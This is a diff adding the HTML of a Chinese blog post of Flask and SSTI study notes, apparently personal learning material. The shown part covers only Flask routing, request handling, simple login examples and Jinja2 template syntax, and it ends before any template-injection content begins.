@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="flask框架&amp;&amp;ssti 学习笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="flask框架&amp;&amp;ssti学习笔记">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/53614.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="flask框架&amp;&amp;ssti 学习笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67d4365588c538a9b5bdb1cb.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67d4394b88c538a9b5bdb2ed.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67d43f4088c538a9b5bdb473.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67d4300f88c538a9b5bdb014.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67d4353588c538a9b5bdb15c.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67d441d088c538a9b5bdb528.png">
+<meta property="article:published_time" content="2025-03-14T10:26:30.000Z">
+<meta property="article:modified_time" content="2025-03-14T16:39:36.935Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67d4365588c538a9b5bdb1cb.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/53614.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>flask框架&&ssti学习笔记 | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">64</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/53614.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          flask框架&&ssti学习笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-03-14 18:26:30" itemprop="dateCreated datePublished" datetime="2025-03-14T18:26:30+08:00">2025-03-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-03-15 00:39:36" itemprop="dateModified" datetime="2025-03-15T00:39:36+08:00">2025-03-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+      
+      
+        <p>flask框架&amp;&amp;ssti 学习笔记</p>
+<span id="more"></span>
+<p>最近做web题的时候碰到了很多flask框架，我感觉必须得学一下这个框架了，而且这个题很多和ssti结合的</p>
+<h1 id="什么是flask框架"><a href="#什么是flask框架" class="headerlink" title="什么是flask框架"></a>什么是flask框架</h1><h2 id="flask简介"><a href="#flask简介" class="headerlink" title="flask简介"></a>flask简介</h2><p>Flask 是一个用 Python 编写的轻量级 Web 应用框架，基于 Werkzeug WSGI 工具箱和 Jinja2 模板引擎。<br>作为一个微框架，Flask 提供核心功能，但没有内置的数据库抽象层或表单验证工具。这使得开发者可以根据需要选择合适的扩展来添加功能，保持了框架的灵活性。Flask 被称为“微框架”，因为它使用简单的核心，用扩展增加其他功能。</p>
+<p>Flask 的主要特点包括：</p>
+<ul>
+<li>内建开发用服务器和调试器</li>
+<li>集成的单元测试支持</li>
+<li>RESTful 请求分派</li>
+<li>使用 Jinja2 模板引擎</li>
+<li>支持安全 cookie（客户端会话）</li>
+<li>完全兼容 WSGI 1.0</li>
+<li>基于 Unicode</li>
+<li>详细的文档和教程</li>
+<li>兼容 Google App Engine</li>
+<li>可通过扩展增加其他功能<br>用flask创建一个web应用的简单示例：</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></div>
+<h2 id="路由和试图函数"><a href="#路由和试图函数" class="headerlink" title="路由和试图函数"></a>路由和试图函数</h2><p>在 Flask 框架中，路由 和 视图函数 是构建 Web 应用的核心概念</p>
+<p>路由：定义了 URL 与视图函数之间的映射关系。当用户访问特定的 URL 时，Flask 根据路由规则调用相应的视图函数处理请求。<br>视图函数：处理特定 URL 请求的函数，通常返回一个响应，例如 HTML 页面或 JSON 数据。<br>动态路由与变量规则：<br>&emsp;Flask 支持在路由中定义动态部分，允许在 URL 中捕获变量。<br>常用的动态路由规则包括：</p>
+<ol>
+<li>URL 路由的一部分可以标记为变量：使用尖括号 &lt;变量名&gt; 表示。例如，&#x2F;user&#x2F;<username>&#x2F;。</li>
+<li>指定变量类型：可以在变量名前添加类型说明，如 int、string、float、uuid 等。格式为 &lt;类型:变量名&gt;。</li>
+<li>示例：<br>定义一个整数类型的动态路由：</li>
+</ol>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;int:id&gt;/comments/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">comments</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;这是一个 <span class="subst">&#123;<span class="built_in">id</span>&#125;</span> 的评论页面&quot;</span></span><br></pre></td></tr></table></figure></div>
+<p>定义一个字符串类型的动态路由：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/welcome/&lt;string:username&gt;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&lt;h1&gt;欢迎用户 <span class="subst">&#123;username&#125;</span> 登陆网站&lt;/h1&gt;&quot;</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><ul>
+<li>render_template: 用于渲染模板并返回包含动态内容的 HTML 页面。它的主要作用是将模板文件与数据结合，生成最终的 HTML 响应。<br>示例</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    user = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;Alice&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;home.html&#x27;</span>, user=user)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>redirect: 用于将客户端重定向到不同的 URL。<br>示例</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    <span class="comment"># 执行注销逻辑</span></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>url_for(endpoint, **values)：生成指定视图函数的 URL。常用于在模板或视图函数中动态生成链接。</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> app.test_request_context():</span><br><span class="line">    <span class="built_in">print</span>(url_for(<span class="string">&#x27;index&#x27;</span>))  <span class="comment"># 输出: &#x27;/&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(url_for(<span class="string">&#x27;login&#x27;</span>))  <span class="comment"># 输出: &#x27;/login&#x27;</span></span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>request: 获取当前请求的数据，例如表单数据、查询参数、文件等。</li>
+<li>session: 用于存储会话数据，通常用于保存用户的登录状态等信息。</li>
+<li>before_first_request: 在处理第一个请求之前执行的函数。</li>
+<li>before_request：在每个请求之前执行的函数。</li>
+<li>teardown_request：在每个请求结束时执行的函数，无论请求是否成功。</li>
+<li>context_processor：用于在模板中自动提供全局变量的函数。</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.context_processor</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_user</span>():</span><br><span class="line">    user = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;Alice&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dict</span>(user=user)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+<h2 id="登录验证之HTTP请求方法"><a href="#登录验证之HTTP请求方法" class="headerlink" title="登录验证之HTTP请求方法"></a>登录验证之HTTP请求方法</h2><p>http请求方法</p>
+<ul>
+<li>GET方法<br>1.获取页面信息<br>2.可以提交数据信息，但信息数据不安全，会显示用户帐号密码</li>
+<li>POST方法<br>提交服务端需要的请求信息，url不会显示用户的相关信息，有利于数据的安全性</li>
+<li>PUT方法<br>用户向服务器指定url上传资源</li>
+<li>DELETE方法<br>用户向服务器指定url删除资源</li>
+</ul>
+<p>get请求方式示例</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span>  <span class="string">&quot;&lt;h1&gt;主页&lt;/h1&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="comment"># 一般情况， 不会直接把html文件内容直接返回；</span></span><br><span class="line">    <span class="comment"># 而是将html文件保存到当前的templates目录中；</span></span><br><span class="line">    <span class="comment">#       1). 通过render_template方法调用;</span></span><br><span class="line">    <span class="comment">#       2). 默认情况下,Flask 在程序文件夹中的 templates 子文件夹中寻找模板。</span></span><br><span class="line">    <span class="keyword">return</span>  render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login2/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login2</span>():</span><br><span class="line">    <span class="comment"># 获取用户输入的用户名</span></span><br><span class="line">    username = request.args.get(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    password = request.args.get(<span class="string">&#x27;password&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="comment"># 逻辑处理， 用来判断用户和密码是否正确;</span></span><br><span class="line">    <span class="keyword">if</span> username == <span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;redhat&#x27;</span>:</span><br><span class="line">        <span class="comment"># 重定向到指定路由；</span></span><br><span class="line">        <span class="keyword">return</span>  redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        <span class="comment"># return &quot;登录成功&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span>  <span class="string">&quot;登录失败&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></div>
+<p>post</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span>  Flask, request, render_template, redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span>  <span class="string">&quot;这是主页&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认路由只支持get方法， 如何指定接受post方法?</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="comment"># 难点: post请求提交的数据如何获取?</span></span><br><span class="line">        <span class="built_in">print</span>(request.form)</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="comment"># 如果用户名和密码正确， 跳转到主页;</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;redhat&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span>  redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        <span class="comment"># 如果登录不正确， 则警告红色信息;还是在登录页面;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 可以给html传递变量</span></span><br><span class="line">            <span class="keyword">return</span>  render_template(<span class="string">&#x27;login_post.html&#x27;</span>,</span><br><span class="line">                                    errMessages=<span class="string">&quot;用户名或者密码错误&quot;</span></span><br><span class="line">                                    )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span>  render_template(<span class="string">&#x27;login_post.html&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></div>
+<h2 id="模板jinja2"><a href="#模板jinja2" class="headerlink" title="模板jinja2"></a>模板jinja2</h2><h3 id="什么是Jinja2模板引擎"><a href="#什么是Jinja2模板引擎" class="headerlink" title="什么是Jinja2模板引擎?"></a>什么是Jinja2模板引擎?</h3><p>1). python的Web开发中， 业务逻辑(实质就是视图函数的内容)和页面逻辑(html文件)分开的， 使得代码的可读性增强， 代码容易理解和维护；</p>
+<p>2). 模板渲染: 在html文件中，通过动态赋值 ，将重新翻译好的html文件(模板引擎生效) 返回给用户的过程。</p>
+<p>3). 其他的模板引擎: Mako, Template, Jinja2</p>
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>1). Jinja2变量显示语法: <code>&#123;&#123; 变量名 &#125;&#125;</code><br>Jinja2变量内置过滤器:<br>    safe 渲染值时不转义<br>    capitalize 把值的首字母转换成大写,其他字母转换成小写<br>    lower 把值转换成小写形式<br>    upper 把值转换成大写形式<br>    title 把值中每个单词的首字母都转换成大写<br>    trim 把值的首尾空格去掉<br>    striptags 渲染之前把值中所有的 HTML 标签都删掉<br>自定义过滤器</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.template_filter(<span class="params"><span class="string">&#x27;capitalize&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">capitalize_filter</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(text, <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> text.capitalize()</span><br><span class="line">    <span class="keyword">return</span> text</span><br></pre></td></tr></table></figure></div>
+<p>在模板中使用该过滤器：<br><code>&lt;p&gt;&#123;&#123; 'hello world' | capitalize &#125;&#125;&lt;/p&gt;</code><br>通过管道符 | 将变量传递给过滤器。可以链式使用多个过滤器<br>2). for循环:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DJANGO"><figure class="iseeu highlight /django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> i <span class="keyword">in</span> li%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span></span><br></pre></td></tr></table></figure></div>
+<p>3). if语句</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DJANGO"><figure class="iseeu highlight /django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> user == ‘westos’%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">elif</span></span> user == ‘hello’ %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">else</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span>%&#125;</span></span><br></pre></td></tr></table></figure></div>
+<p>在jinja2中</p>
